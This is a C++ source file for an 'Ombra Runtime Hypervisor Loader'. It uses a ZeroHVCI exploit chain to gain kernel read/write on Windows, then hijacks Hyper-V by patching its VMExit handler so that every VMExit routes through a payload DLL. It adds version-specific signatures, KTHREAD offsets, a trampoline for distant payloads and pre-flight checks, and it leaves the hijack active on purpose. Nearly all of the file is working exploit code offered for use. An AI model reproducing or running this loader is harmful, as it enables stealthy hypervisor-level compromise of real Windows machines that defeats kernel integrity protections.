// Complete Runtime Hyper-V Hijacking Example
// Demonstrates the full ZeroHVCI -> Hyper-V hijack pipeline with:
// - Windows version detection
// - Version-specific signature selection
// - Trampoline mechanism for >2GB payloads
// - IndirectContext support for builds >= 17763
//
// Run as Administrator with Hyper-V enabled

#include "zerohvci.h"
#include "hyperv_hijack.h"
#include "version_detect.h"
#include "trampoline.h"
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <vector>

namespace OmbraLoader {

// Helper to load payload DLL from disk
std::vector<BYTE> LoadPayloadFile(const char* path)
{
    std::vector<BYTE> data;
    std::ifstream file(path, std::ios::binary | std::ios::ate);

    if (!file.is_open())
    {
        printf("[-] Could not open payload file: %s\n", path);
        return data;
    }

    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);

    data.resize(size);
    if (!file.read((char*)data.data(), size))
    {
        printf("[-] Could not read payload file\n");
        data.clear();
    }

    return data;
}

// Example 1: Basic runtime hijacking with automatic version detection
int BasicRuntimeHijack(const char* payloadPath)
{
    printf("\n========================================\n");
    printf("  Runtime Hyper-V Hijacking Example\n");
    printf("  Multi-Version Support Enabled\n");
    printf("========================================\n\n");

    // Phase 1: Initialize ZeroHVCI exploit chain
    printf("[PHASE 1] Initializing ZeroHVCI exploit...\n");
    if (!zerohvci::Initialize())
    {
        printf("[-] ZeroHVCI initialization failed\n");
        printf("    Make sure you're running as Administrator\n");
        return -1;
    }
    printf("[+] ZeroHVCI initialized - kernel R/W primitive available\n");

    // Phase 2: Initialize RuntimeHijacker (includes version detection)
    printf("\n[PHASE 2] Initializing RuntimeHijacker...\n");
    zerohvci::hyperv::RuntimeHijacker hijacker;

    if (!hijacker.Initialize())
    {
        printf("[-] RuntimeHijacker initialization failed\n");
        zerohvci::Cleanup();
        return -2;
    }

    // Display detected configuration
    printf("\n[*] Detected Configuration:\n");
    printf("    CPU Vendor: %s\n", hijacker.IsIntel() ? "Intel (VMX)" : "AMD (SVM)");
    printf("    Windows Build: %u\n", zerohvci::version::g_VersionInfo.BuildNumber);
    printf("    IndirectContext Required: %s\n", hijacker.RequiresIndirectContext() ? "Yes" : "No");
    printf("    Hook Length: %u bytes\n", hijacker.GetHookLen());

    // Phase 3: Load payload
    printf("\n[PHASE 3] Loading payload...\n");
    std::vector<BYTE> payloadData = LoadPayloadFile(payloadPath);
    if (payloadData.empty())
    {
        printf("[-] Failed to load payload\n");
        zerohvci::Cleanup();
        return -3;
    }
    printf("[+] Payload loaded: %zu bytes\n", payloadData.size());

    // Phase 4: Hijack Hyper-V
    printf("\n[PHASE 4] Hijacking Hyper-V...\n");
    if (!hijacker.HijackHyperV(payloadData.data(), payloadData.size()))
    {
        printf("[-] Hyper-V hijack failed\n");
        zerohvci::Cleanup();
        return -4;
    }

    // Phase 5: Display results
    printf("\n========================================\n");
    printf("  HIJACK SUCCESSFUL!\n");
    printf("========================================\n");
    printf("Payload Base:     0x%llX\n", hijacker.GetPayloadBase());
    printf("Original Handler: 0x%llX\n", hijacker.GetOriginalHandler());

    if (hijacker.UsesTrampoline())
    {
        printf("Trampoline:       0x%llX (used due to >2GB distance)\n",
            hijacker.GetTrampolineAddr());
    }
    else
    {
        printf("Trampoline:       Not needed (direct patch)\n");
    }

    printf("\nAll VMExits now route through the payload.\n");
    printf("Test with CPUID leaf 0x13371337 to verify.\n");

    // Note: Don't cleanup - keep hijack active
    return 0;
}

// Example 2: Version detection diagnostic
int VersionDiagnostic()
{
    printf("\n========================================\n");
    printf("  Windows Version Detection Diagnostic\n");
    printf("========================================\n\n");

    // Detect version
    if (!zerohvci::version::DetectWindowsVersion())
    {
        printf("[-] Version detection failed\n");
        return -1;
    }

    const auto& ver = zerohvci::version::g_VersionInfo;
    printf("[+] Windows Version Information:\n");
    printf("    Major: %u\n", ver.MajorVersion);
    printf("    Minor: %u\n", ver.MinorVersion);
    printf("    Build: %u\n", ver.BuildNumber);
    printf("    Revision: %u\n", ver.Revision);
    printf("    Is Server: %s\n", ver.IsServer ? "Yes" : "No");
    printf("    Is Intel: %s\n", ver.IsIntel ? "Yes" : "No");
    printf("    Friendly Name: %s\n", zerohvci::version::GetVersionName(ver.BuildNumber));

    // Check KTHREAD offsets
    printf("\n[*] KTHREAD Offsets for this build:\n");
    printf("    PreviousMode: 0x%X\n", zerohvci::version::GetKThreadPreviousModeOffset());

    auto offsets = zerohvci::version::GetKThreadOffsets(ver.BuildNumber);
    if (offsets)
    {
        printf("    StackBase: 0x%X\n", offsets->StackBaseOffset);
        printf("    KernelStack: 0x%X\n", offsets->KernelStackOffset);
        printf("    State: 0x%X\n", offsets->StateOffset);
    }

    // Check signature availability
    printf("\n[*] VMExit Signature Database:\n");

    const auto* intelSig = zerohvci::version::FindVmExitSignature(ver.BuildNumber, true);
    if (intelSig)
    {
        printf("    Intel: Found (builds %u-%u, CallOffset=0x%X, IndirectContext=%s)\n",
            intelSig->MinBuild, intelSig->MaxBuild, intelSig->CallOffset,
            intelSig->IndirectContext ? "true" : "false");
    }
    else
    {
        printf("    Intel: Not found - will use legacy patterns\n");
    }

    const auto* amdSig = zerohvci::version::FindVmExitSignature(ver.BuildNumber, false);
    if (amdSig)
    {
        printf("    AMD: Found (builds %u-%u, CallOffset=0x%X)\n",
            amdSig->MinBuild, amdSig->MaxBuild, amdSig->CallOffset);
    }
    else
    {
        printf("    AMD: Not found - will use legacy patterns\n");
    }

    // IndirectContext check
    printf("\n[*] Context Indirection:\n");
    printf("    This build %s IndirectContext (context is %s)\n",
        zerohvci::version::RequiresIndirectContext(ver.BuildNumber) ? "REQUIRES" : "does NOT require",
        zerohvci::version::RequiresIndirectContext(ver.BuildNumber) ? "pointer-to-pointer" : "direct pointer");

    return 0;
}

// Example 3: Trampoline diagnostic
int TrampolineDiagnostic()
{
    printf("\n========================================\n");
    printf("  Trampoline Mechanism Diagnostic\n");
    printf("========================================\n\n");

    printf("[*] Trampoline Architecture:\n");
    printf("    x86-64 CALL rel32 has +/-2GB range limit\n");
    printf("    If payload allocated >2GB from hv.exe, trampoline is needed\n\n");

    printf("[*] Trampoline Code (12 bytes):\n");
    printf("    mov rax, <64-bit address>  ; 48 B8 <8 bytes>\n");
    printf("    jmp rax                     ; FF E0\n\n");

    printf("[*] Allocation Strategies:\n");
    printf("    1. Find slack space in hv.exe (int3/nop padding)\n");
    printf("    2. Allocate kernel pool near hv.exe base\n\n");

    // Build a test trampoline structure
    zerohvci::trampoline::TrampolineCode testTramp;
    zerohvci::trampoline::BuildTrampolineCode(&testTramp, 0xFFFFF80012345678ULL);

    printf("[*] Test Trampoline for 0xFFFFF80012345678:\n");
    printf("    Bytes: ");
    const uint8_t* bytes = (const uint8_t*)&testTramp;
    for (size_t i = 0; i < sizeof(testTramp); i++)
    {
        printf("%02X ", bytes[i]);
    }
    printf("\n");
    printf("    Expected: 48 B8 78 56 34 12 00 F8 FF FF FF E0\n");

    // Verify structure size
    static_assert(sizeof(zerohvci::trampoline::TrampolineCode) == 12,
        "TrampolineCode size must be 12 bytes");
    printf("\n[+] Trampoline code structure verified (12 bytes)\n");

    return 0;
}

// Example 4: Pre-flight checks before hijacking
int PreFlightChecks()
{
    printf("\n========================================\n");
    printf("  Pre-Flight System Checks\n");
    printf("========================================\n\n");

    int issues = 0;

    // Check 1: Administrator
    printf("[*] Checking Administrator privileges...\n");
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdminGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdminGroup))
    {
        CheckTokenMembership(NULL, AdminGroup, &isAdmin);
        FreeSid(AdminGroup);
    }
    printf("    Administrator: %s\n", isAdmin ? "Yes" : "NO - REQUIRED");
    if (!isAdmin) issues++;

    // Check 2: Windows version
    printf("[*] Checking Windows version...\n");
    if (zerohvci::version::DetectWindowsVersion())
    {
        const auto& ver = zerohvci::version::g_VersionInfo;
        bool supported = (ver.BuildNumber >= 16299 && ver.BuildNumber <= 26200);
        printf("    Build %u: %s\n", ver.BuildNumber,
            supported ? "Supported" : "UNSUPPORTED");
        if (!supported) issues++;
    }
    else
    {
        printf("    Could not detect version\n");
        issues++;
    }

    // Check 3: Hyper-V status
    printf("[*] Checking Hyper-V...\n");
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    bool vmxSupported = (cpuInfo[2] & (1 << 5)) != 0;
    printf("    CPU Virtualization: %s\n", vmxSupported ? "Supported" : "NOT SUPPORTED");

    __cpuid(cpuInfo, 0x40000000);
    char hvVendor[13] = { 0 };
    *(int*)(hvVendor + 0) = cpuInfo[1];
    *(int*)(hvVendor + 4) = cpuInfo[2];
    *(int*)(hvVendor + 8) = cpuInfo[3];
    bool hvRunning = (strncmp(hvVendor, "Microsoft Hv", 12) == 0);
    printf("    Hyper-V Running: %s\n", hvRunning ? "Yes" : "NO - REQUIRED");
    if (!hvRunning) issues++;

    // Summary
    printf("\n========================================\n");
    if (issues == 0)
    {
        printf("  All checks PASSED - ready to hijack\n");
    }
    else
    {
        printf("  %d issue(s) found - resolve before proceeding\n", issues);
    }
    printf("========================================\n");

    return issues;
}

} // namespace OmbraLoader

// Main entry point
int main(int argc, char* argv[])
{
    printf("========================================\n");
    printf("  Ombra Runtime Hypervisor Loader\n");
    printf("  Multi-Version Support v1.0\n");
    printf("========================================\n");

    // Parse command line
    if (argc < 2)
    {
        printf("\nUsage:\n");
        printf("  %s hijack <payload.dll>  - Hijack Hyper-V with payload\n", argv[0]);
        printf("  %s version              - Version detection diagnostic\n", argv[0]);
        printf("  %s trampoline           - Trampoline mechanism diagnostic\n", argv[0]);
        printf("  %s preflight            - Pre-flight system checks\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "hijack") == 0)
    {
        if (argc < 3)
        {
            printf("[-] Missing payload path\n");
            return 1;
        }
        return OmbraLoader::BasicRuntimeHijack(argv[2]);
    }
    else if (strcmp(argv[1], "version") == 0)
    {
        return OmbraLoader::VersionDiagnostic();
    }
    else if (strcmp(argv[1], "trampoline") == 0)
    {
        return OmbraLoader::TrampolineDiagnostic();
    }
    else if (strcmp(argv[1], "preflight") == 0)
    {
        return OmbraLoader::PreFlightChecks();
    }
    else
    {
        printf("[-] Unknown command: %s\n", argv[1]);
        return 1;
    }
}
